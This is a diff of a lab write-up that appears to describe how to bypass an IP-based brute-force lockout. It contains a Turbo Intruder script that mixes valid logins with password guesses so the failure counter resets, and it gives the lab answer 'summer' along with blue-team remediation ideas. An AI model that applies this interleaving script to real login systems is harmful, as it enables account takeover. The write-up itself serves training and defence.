@@ -21,8 +21,7 @@ tags:
 - [Lab Setup and Tools](#lab-setup-and-tools)
 - [What's the password?](#main-question)
   - [Solution Steps](#solution)
-- [Key Takeaways](#key-takeaways)
-- [What I'd Do Next](#what-id-do-next)
+- [What I'd Do Next (Blue Team)](#what-id-do-next)
 
 # Overview / Goal
 
@@ -41,6 +40,8 @@ This lab introduces IP-based brute-force protection. After too many failed attem
 
 - Burp Suite + Firefox (through FoxyProxy)
 - Turbo Intruder extension
+
+---
 
 # What's the Password? {#main-question}
 
@@ -83,18 +84,11 @@ def queueRequests(target, wordlists):
                            requestsPerConnection=1,
                            pipeline=False
                            )
-
-    # Read all passwords into a list
     passwords = [line.rstrip() for line in open('/home/kali/pw')]
-
     password_index = 0
     total_passwords = len(passwords)
-
-    # Continue until we've tried all passwords
     while password_index < total_passwords:
-        # First, queue the successful wiener login
         engine.queue(target.req, ['wiener', 'peter'])
-        # Then queue up to 2 password attempts for carlos
         for i in range(2):
             if password_index < total_passwords:
                 engine.queue(target.req, ['carlos', passwords[password_index]])
@@ -112,15 +106,10 @@ I manually logged in with carlos:summer and the lab was solved! 🥳
 
 **Answer**: summer ✅
 
-# Key Takeaways
+---
 
-This lab gives an example of a **logic flaw** in brute-force protection strategies. While the IP blocking idea seemed secure on the surface, the reset behaviour for successful logins created a bypass opportunity.
+# What I'd Do Next (Blue Team) {#what-id-do-next}
 
-# What I'd Do Next
-
-To fix this vulnerability, I'd implement:
-
-1. Count failed attempts separately for each username
-2. Limit total login attempts regardless of success/failure
-3. Gradually increase wait times after multiple failures
-4. CAPTCHA challenges After several failed attempts
+- Ensure that a successful login for "User A" does not reset the failure counter for "User B".
+- I'd use a better approach. Example: If an IP has 6 failures in an hour, it gets flagged regardless of whether it managed to log in successfully once in the middle of that window.
+- I would configure the WAF to detect "interleaved" login patterns where a single IP is jumping between multiple accounts rapidly. If I see a successful login immediately following a series of failures, I'd flag that session as "High Risk" and force an MFA prompt or an email notification to the user, even if the password was correct.
